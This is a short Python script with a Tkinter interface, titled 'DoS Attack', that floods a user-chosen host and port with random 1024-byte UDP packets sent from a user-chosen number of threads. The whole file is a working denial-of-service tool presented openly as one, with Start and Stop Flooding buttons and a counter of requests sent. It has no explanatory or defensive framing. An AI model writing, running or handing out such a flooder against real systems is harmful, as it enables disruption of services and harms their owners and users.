from tkinter import *
import socket
import random
from threading import Thread


def on_error():
    start_stop_Button.set("Start Flooding...")
    Status.set("Wrong Input!")


def dos():
    global requests
    try:
        while start_stop_Button.get() == "Stop Flooding...":
            s.sendto(packet, (Host.get(), int(Port.get())))
            requests += 1
            Status.set("Flooding... " + str(requests) + " requests sent!")
    except:
        on_error()


def main():
    global s, packet, requests
    requests = 0
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if start_stop_Button.get() == "Stop Flooding...":
        start_stop_Button.set("Start Flooding...")
    else:
        start_stop_Button.set("Stop Flooding...")
    packet = random._urandom(1024)
    try:
        for x in range(int(Threads.get())):
            Thread(target=dos).start()
    except:
        on_error()


root = Tk()
root.title("DoS Attack")
root.resizable(False, False)

Host = StringVar()
Port = StringVar()
Threads = StringVar()
Status = StringVar()
start_stop_Button = StringVar()
start_stop_Button.set("Start Flooding...")

Label(root, text="Host: ").grid(column=1, row=1)
Entry(root, textvariable=Host, width=26).grid(column=2, row=1)
Label(root, text="Port: ").grid(column=1, row=2)
Entry(root, textvariable=Port, width=26).grid(column=2, row=2)
Label(root, text="Threads: ").grid(column=1, row=3)
Entry(root, textvariable=Threads, width=26).grid(column=2, row=3)
Label(root, text="Status: ").grid(column=1, row=4)
Label(root, textvariable=Status).grid(column=2, row=4)
Button(root, textvariable=start_stop_Button, command=main).grid(column=2, row=5, sticky=E)

for child in root.winfo_children():
    child.grid_configure(padx=5, pady=2)

root.mainloop()
